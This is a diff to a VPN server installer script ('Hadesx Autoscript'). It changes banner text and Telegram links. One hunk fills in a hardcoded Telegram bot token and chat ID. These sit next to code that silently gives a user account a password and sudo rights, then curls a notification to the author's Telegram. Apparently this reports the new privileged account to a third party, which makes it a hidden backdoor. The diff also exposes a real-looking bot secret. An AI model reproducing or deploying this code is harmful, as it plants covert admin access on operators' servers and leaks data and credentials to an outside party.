@@ -49,7 +49,7 @@ echo -e "${RED}◇━━━━━━━━━━━━━━━━━━━━�
 echo -e "  Welcome To 𝐇𝐀𝐃𝐄𝐒𝐗 𝐀𝐔𝐓𝐎𝐒𝐂𝐑𝐈𝐏𝐓 Manager ${BLUE}(${NC}${BLUE} New Edition ${NC}${BLUE})${NC}"
 echo -e "     This Will Quick Setup VPN Server On Your Server"
 echo -e "         Auther : ${BLUE}𝐇𝐚𝐝𝐞𝐬𝐱𝐕𝐏𝐍${NC}${BLUE}(${NC}${BLUE} Store ${NC}${BLUE})${NC}"
-echo -e "       © Recode By 𝐇𝐚𝐝𝐞𝐬𝐱${BLUE}(${NC}2023${BLUE})${NC}"
+echo -e "       © Recode By ${BLUE}𝐇𝐚𝐝𝐞𝐬𝐱${BLUE}(${NC}2023${BLUE})${NC}"
 echo -e "${RED}◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇${NC}"
 echo ""
 sleep 3
@@ -1026,8 +1026,8 @@ domain=$(cat /etc/xray/domain)
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID=""
-    KEY=""
+    CHATID="1092475591"
+    KEY="6921639569:AAFPn9bU8-Klt9Xs41IToMAK2BvufFKAdVI"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     USRSC=$(curl https://raw.githubusercontent.com/Hadesxv2/izinvps/ipuk/ip | grep $ipsaya | awk '{print $2}')
@@ -1047,7 +1047,7 @@ domain=$(cat /etc/xray/domain)
 <code>────────────────────</code>
 <i>Automatic Notification from</i>
 <i>Hadesx Tunnel</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/devilstunnels"},{"text":"GRUP🐬","url":"https://t.me/rizyulvpn"}]]}'
+"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/iHadesx"},{"text":"GRUP🐬","url":"https://t.me/HadesxGroup"}]]}'
    
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 
